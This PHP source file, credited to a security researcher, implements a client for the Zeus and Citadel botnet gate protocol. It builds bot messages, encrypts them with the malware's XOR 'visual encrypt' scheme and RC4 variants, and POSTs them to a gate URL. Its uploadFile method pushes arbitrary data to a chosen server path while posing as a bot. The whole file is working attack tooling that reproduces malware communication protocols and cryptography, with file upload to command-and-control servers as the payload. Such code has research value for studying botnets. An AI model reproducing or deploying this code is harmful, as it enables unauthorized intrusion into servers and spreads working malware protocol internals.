<?php
    # coded by Rotem Kerner
    # http://www.kerneronsec.com/


namespace Zeus{

require_once 'Zend/Http/Client.php';
require_once 'Repository.class.php';
require_once 'Encryption.class.php';


define('HEADER_SIZE',      48); //sizeof(BinStorage::STORAGE)
define('HEADER_MD5',       32); //OFFSETOF(BinStorage::STORAGE, MD5Hash)
define('ITEM_HEADER_SIZE', 16); //sizeof(BinStorage::ITEM)

define('SBCID_BOT_ID', 10001);
define('SBCID_BOTNET', 10002);
define('SBCID_BOT_VERSION', 10003);
define('SBCID_NET_LATENCY', 10005);
define('SBCID_TCPPORT_S1', 10006);
define('SBCID_PATH_SOURCE', 10007);
define('SBCID_PATH_DEST', 10008);
define('SBCID_TIME_SYSTEM', 10009);
define('SBCID_TIME_TICK', 10010);
define('SBCID_TIME_LOCALBIAS', 10011);
define('SBCID_OS_INFO', 10012);
define('SBCID_LANGUAGE_ID', 10013);
define('SBCID_PROCESS_NAME', 10014);
define('SBCID_PROCESS_USER', 10015);
define('SBCID_IPV4_ADDRESSES', 10016);
define('SBCID_IPV6_ADDRESSES', 10017);
define('SBCID_BOTLOG_TYPE', 10018);
define('SBCID_BOTLOG', 10019);
define('SBCID_SCRIPT_ID', 11000);
define('SBCID_SCRIPT_STATUS', 11001);
define('SBCID_SCRIPT_RESULT', 11002);

define('SBCID_LOGIN_KEY', 10021);

define('ZEUS_EXCEPTION_EMPTY_RESPONSE', 102);
define('ZEUS_EXCEPTION_UNEXPECTED_RESPONSE',101 );
define('ZEUS_EXCEPTION_UNABLE_TO_CONNECT', 100);

class Zeus_Repository extends \Repository{
    static $namespace = 'Zeus';

}


    class Zeus{

        protected $gateUrl;
        protected $cryptContext;
        protected $cryptAlgo;
        protected $botnetName;
        protected $botId;
        protected $client;

        function  __construct($gateUrl = null, \Encryption\Algorithm $cryptAlgo = null, array $cryptContext = null, $botnetName = null, $botId = null) {

            # set default algo
            $this->cryptAlgo = $cryptAlgo ? $cryptAlgo : Zeus_Repository::getByName('RC4');
            $this->cryptContext = $cryptContext;

            $this->gateUrl = $gateUrl;
            $this->botnetName = $botnetName;
            $this->botId = $botId;

            $this->client = new \Zend_Http_Client();
            $this->client->setMethod('POST');
            if($gateUrl){
                $this->setGateUrl($gateUrl);
            }
            #$this->client->setHeaders('Cookie','XDEBUG_SESSION=netbeans-xdebug');
        }
        public function uploadFile($filePath, $fileData){

            $this->_addField($data, SBCID_BOT_VERSION, 1);
            $this->_addField($data, SBCID_BOT_ID, $this->botId); # 16 bytes
            $this->_addField($data, SBCID_BOTNET, $this->botnetName);
            # Write log / file
            $this->_addField($data, SBCID_BOTLOG, $fileData);
            $this->_addField($data, SBCID_BOTLOG_TYPE, pack('l', 2)); # 2= file
            $this->_addField($data, SBCID_PATH_DEST, $filePath);
            return $this->_sendData($data);


        }

        public function reportStatus($scriptId, $scriptStatus, $scriptResult){
            $this->_addField($data, SBCID_SCRIPT_ID, $scriptId);
            $this->_addField($data, SBCID_SCRIPT_STATUS, $scriptStatus);
            $this->_addField($data, SBCID_SCRIPT_RESULT, $scriptResult);
            return $this->_sendData($data);
        }

        private function _sendData($data){

            $data =  substr(md5(uniqid(rand(), true)), 0, HEADER_MD5).md5($data , true).$data;
            $this->_visualEncrypt($data);
            $this->cryptAlgo->setData($data);
            #$this->cryptAlgo->setKey($this->keyCrypt);
            $this->cryptAlgo->setContext($this->cryptContext);

            $data = @$this->cryptAlgo->run(); # ommiting the notice messages when key is too short
            #$this->_rc4($data, $this->keyCrypt);
            $this->client->setRawData($data);
            try {
                $response = $this->client->request();
            }
            catch (\Exception $e){
                throw new \Exception($e->getMessage(),ZEUS_EXCEPTION_UNABLE_TO_CONNECT);
            }
            $resBody = $response->getBody();
            if(strlen($resBody) > 0){
                $this->cryptAlgo->setContext($this->cryptContext);
                $this->cryptAlgo->setData($resBody);
                $resBody = $this->cryptAlgo->run();
                #$this->_rc4($resBody, $this->keyCrypt);
                $this->_visualDecrypt($resBody);

                if(strstr($resBody,"\x4A\xE7\x13\x36\xE4\x4B\xF9\xBF\x79\xD2\x75\x2E\x23\x48\x18\xA5")){
                    return $resBody;
                }
                else{
                    throw new \Exception("Zeus gateway returned an unexpected response",ZEUS_EXCEPTION_UNEXPECTED_RESPONSE);
                }
            }
            else{
                throw new \Exception("Zeus gateway returned empty response, perhaps the encryption key/algorithm is invalid ?",ZEUS_EXCEPTION_EMPTY_RESPONSE);
            }
        }

        public function setCryptContext(array $context){

            $this->cryptContext = $context;

        }

        public function setAlgorithm(\Encryption\Algorithm $cryptAlgo){
            $this->cryptAlgo = $cryptAlgo;
        }

        public function setKeyCrypt($data){
            $this->keyCrypt = $data;
        }

        public function setGateUrl($url){
            $this->gateUrl = $url;
            $this->client->setUri($this->gateUrl);
        }

        public function setBotnetName($name){
            $this->botnetName = $name;
        }

        public function getBotnetName(){
            return $this->botnetName;
        }

        public function getBotId(){
            return $this->botId;
        }

        public function setBotId($id){
            $this->botId = $id;
        }

        public function setKey($key){
            $this->keyCrypt = $key;

        }
        # DEPRECATED
        public function setKeyWithPass($pass){
            $this->keyCrypt = $this->_rc4Init($pass);
        }
        
        # DEPRECATED
        public function setKeyWithHexByes($hexStr){
            $this->keyCrypt = $hexStr;

        }
        # DEPRECATED
        public function setKeyWithDecArray(array $decArray){
            $this->keyCrypt = $decArray;

        }



        protected function _addField(&$data, $key, $str)  {
            $data .=  pack("L4", $key, "0", strlen($str), "0").$str;
        }


        protected function _rc4Init($key)
        {
            $hash      = array();
            $box       = array();
            $keyLength = strlen($key);

            for($x = 0; $x < 256; $x++)
            {
                $hash[$x] = ord($key[$x % $keyLength]);
                $box[$x]  = $x;
            }

            for($y = $x = 0; $x < 256; $x++)
            {
                $y       = ($y + $box[$x] + $hash[$x]) % 256;
                $tmp     = $box[$x];
                $box[$x] = $box[$y];
                $box[$y] = $tmp;
            }

            return $box;
        }

        protected function _visualEncrypt(&$data)
        {
          $len = strlen($data);
          for($i = 1; $i < $len; $i++)$data[$i] = chr(ord($data[$i]) ^ ord($data[$i - 1]));
        }

        protected function _visualDecrypt(&$data)
        {
          $len = strlen($data);
          if($len > 0)for($i = $len - 1; $i > 0; $i--)$data[$i] = chr(ord($data[$i]) ^ ord($data[$i - 1]));
        }

    }

    class Citadel extends Zeus{

        function __construct($gateUrl = false, \Encryption\Algorithm $cryptAlgo = null, array $cryptContext = array(), $botnetName = false, $botId = false) {
            parent::__construct($gateUrl, $cryptAlgo, $cryptContext, $botnetName, $botId);

            # set default citadel propiery crypto algorithm
     
            $this->cryptAlgo = $cryptAlgo ? $cryptAlgo : new \Encryption\Algorithm_Repository\RC4_Citadel();


        }


        public function uploadFile($filePath, $fileData){

            $this->_addField($data, SBCID_BOT_VERSION, 4);
            $this->_addField($data, SBCID_BOT_ID, $this->botId); # 16 bytes
            $this->_addField($data, SBCID_BOTNET, $this->botnetName);
            $this->_addField($data, SBCID_LOGIN_KEY, $this->cryptContext['login_key']);
            # Write log / file
            $this->_addField($data, SBCID_BOTLOG, $fileData);
            $this->_addField($data, SBCID_BOTLOG_TYPE, pack('l', 2)); # 2= file
            $this->_addField($data, SBCID_PATH_DEST, $filePath);
            return $this->_sendData($data);


        }

        private function _sendData($data){
            $data =  substr(md5(uniqid(rand(), true)), 0, HEADER_MD5).md5($data , true).$data;
            $this->_visualEncrypt($data);

            $this->cryptAlgo->setData($data);
            $this->cryptAlgo->setContext($this->cryptContext);
            $data = @$this->cryptAlgo->run(); # ommiting the notice messages when key is too short

            $this->client->setRawData($data);
            try {
                $response = $this->client->request();
            }
            catch (\Exception $e){
                throw new \Exception($e->getMessage(),ZEUS_EXCEPTION_UNABLE_TO_CONNECT);
            }
            $resBody = $response->getBody();
            if(strlen($resBody) > 0){
                $this->cryptAlgo->setContext($this->cryptContext);
                $this->cryptAlgo->setData($resBody);
                $resBody = $this->cryptAlgo->run();
                #$this->_rc4($resBody, $this->keyCrypt);
                $this->_visualDecrypt($resBody);

                if(strstr($resBody,"\x4A\xE7\x13\x36\xE4\x4B\xF9\xBF\x79\xD2\x75\x2E\x23\x48\x18\xA5")){
                    return $resBody;
                }
                else{
                    throw new \Exception("Zeus gateway returned an unexpected response",ZEUS_EXCEPTION_UNEXPECTED_RESPONSE);
                }
            }
            else{
                throw new \Exception("Zeus gateway returned empty response, perhaps the encryption key/algorithm is invalid ?",ZEUS_EXCEPTION_EMPTY_RESPONSE);
            }
        }

    }

}



?>